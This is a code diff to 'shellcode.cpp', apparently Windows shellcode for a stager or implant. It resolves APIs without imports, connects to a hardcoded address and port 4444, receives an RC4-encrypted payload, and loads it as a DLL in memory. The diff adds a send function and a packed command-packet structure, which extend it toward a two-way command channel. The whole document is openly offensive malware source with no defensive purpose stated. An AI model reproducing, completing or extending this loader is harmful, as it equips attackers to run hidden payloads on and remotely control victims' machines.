@@ -1,7 +1,9 @@
 // shellcode.cpp
 
+#include <winsock2.h>
 #include <windows.h>
 #include <winternl.h>
+#include <stdint.h>
 
 #pragma code_seg(".text$A")
 
@@ -16,12 +18,32 @@ typedef int(WINAPI* fnWSAStartup)(WORD, LPVOID);
 typedef UINT_PTR(WINAPI* fnWSASocketA)(int, int, int, LPVOID, int, DWORD);
 typedef int(WINAPI* fnConnect)(UINT_PTR, const sockaddr*, int);
 typedef int(WINAPI* fnRecv)(UINT_PTR, char*, int, int);
+typedef int(WINAPI* fnSend)(UINT_PTR, const char *, int, int);
+
+#pragma pack(push, 1)
+struct StummPacket
+{
+    uint8_t magic;
+    uint16_t command;
+    uint32_t dataLength;
+    char payload[256];
+};
+#pragma pack(pop)
 
 // Target DLL Entry Point Signature
 typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
 
 #define RAW_IP   0x7F000001     // 127.0.0.1
 #define RAW_PORT 4444           // Port 4444
+
+inline void* memcpy(void* dest, const void* src, size_t n) {
+    char* d = (char*)dest;
+    const char* s = (const char*)src;
+    for (size_t i = 0; i < n; i++) {
+        d[i] = s[i];
+    }
+    return dest;
+}
 
 static void rc4_decrypt(const unsigned char *key, int key_len, char *rawBuf, unsigned int payload_size)
 {
@@ -57,13 +79,14 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
         return;
 
     // Resolve Essential Kernel32 APIs
-    char strLoadLibrary[]  = "LoadLibraryA";
-    char strVirtualAlloc[] = "VirtualAlloc";
-    char strWs2[]          = "ws2_32.dll";
-    char strWSAStartup[]   = "WSAStartup";
-    char strWSASocketA[]   = "WSASocketA";
-    char strConnect[]      = "connect";
-    char strRecv[]         = "recv";
+    char strLoadLibrary[]   = "LoadLibraryA";
+    char strVirtualAlloc[]  = "VirtualAlloc";
+    char strWs2[]           = "ws2_32.dll";
+    char strWSAStartup[]    = "WSAStartup";
+    char strWSASocketA[]    = "WSASocketA";
+    char strConnect[]       = "connect";
+    char strRecv[]          = "recv";
+    char strSend[]          = "send";
     
     fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)CustomGetProcAddress(kernel32, strLoadLibrary);
     fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)CustomGetProcAddress(kernel32, strVirtualAlloc);
@@ -78,10 +101,11 @@ extern "C" __attribute__((section(".text$A"))) void ShellcodeEntry() {
     fnWSASocketA pWSASocketA = (fnWSASocketA)CustomGetProcAddress((ULONG_PTR)hWs2, strWSASocketA);
     fnConnect pConnect = (fnConnect)CustomGetProcAddress((ULONG_PTR)hWs2, strConnect);
     fnRecv pRecv = (fnRecv)CustomGetProcAddress((ULONG_PTR)hWs2, strRecv);
+    fnSend pSend = (fnSend)CustomGetProcAddress((ULONG_PTR)hWs2, strSend);
 
     // Initialize Winsock Stack
-    char wsaData[400];
-    if (pWSAStartup(0x0202, &wsaData) != 0)
+    WSADATA wsaData;
+    if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return;
 
     // Open Socket
